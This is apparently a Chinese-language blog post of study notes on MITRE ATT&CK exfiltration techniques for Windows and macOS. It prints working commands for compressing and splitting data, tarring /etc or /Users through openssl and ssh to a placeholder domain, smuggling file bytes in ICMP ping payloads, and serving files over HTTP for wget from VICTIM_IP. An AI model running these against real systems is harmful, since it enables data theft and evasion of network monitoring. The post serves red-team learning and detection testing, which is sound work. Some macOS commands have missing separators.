---
layout: post
title: 跟着ATT&CK学安全之exfiltration
excerpt: "跟着ATT&CK学安全之exfiltration"
categories: [ATT&CK]
comments: true
---
### T1002 - Data Compressed
###### 测试1 Compress Data for Exfiltration With PowerShell
```
dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
```
clean up
```
Remove-Item -path #{output_file}
```
其他的不列举了,都是一些简单的压缩命令,没有技术含量

win10成功复现
### T1022 - Data Encrypted
暂时不列举,就是一些带密码的压缩命令
### T1030 - Data Transfer Size Limits
将文件分割,绕过大小限制
```bash
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l
```
win10成功复现
### T1048 - Exfiltration Over Alternative Protocol
###### 测试1 Exfiltration Over Alternative Protocol - SSH
```
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
```
或者
```
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
```
应该可以
###### 测试2 通过ICMP协议传送数据
`$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\Windows\System32\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send("127.0.0.1", 1500, $Data) }`
win10成功复现
###### 测试3 通过Http协议传送数据
搭建http服务
```bash
cd /tmp/victim-staging-area && python -m SimpleHTTPServer 1337
```
下载
```bash
wget http://VICTIM_IP:1337/victim-file.txt
```
win10成功复现

## macos

## T1030 - Data Transfer Size Limits

红队可以通过调整传输文件的大小来绕过一些网络监控的告警，Demo如下

###### Demo1 通过命令切分文件大小

```
cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}
```

## T1048 - Exfiltration Over Alternative Protocol

红队可以选择一些特定的协议将数据传送出去，包括FTP, SMTP, HTTP/S, DNS, SMB，一些Demo如下

###### Demo1 通过ssh协议传输数据

```
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
```

或者使用如下命令将数据加密后传输

```
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
```

## T1048.003 - Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

红队可以将数据混淆或进行伪装，来绕过网络监控的检测，Demo如下

###### Demo1 通过http传输

1. 受害者机器上操作

   ```
   mkdir /tmp/victim-staging-area echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt
   ```

2. 使用python搭建http服务

   ```
   cd /tmp/victim-staging-area python -m SimpleHTTPServer 1337
   ```

3. 数据传输

   ```
   wget http://VICTIM_IP:1337/victim-file.txt
   ```

   PS:有人用这种方法？感觉很土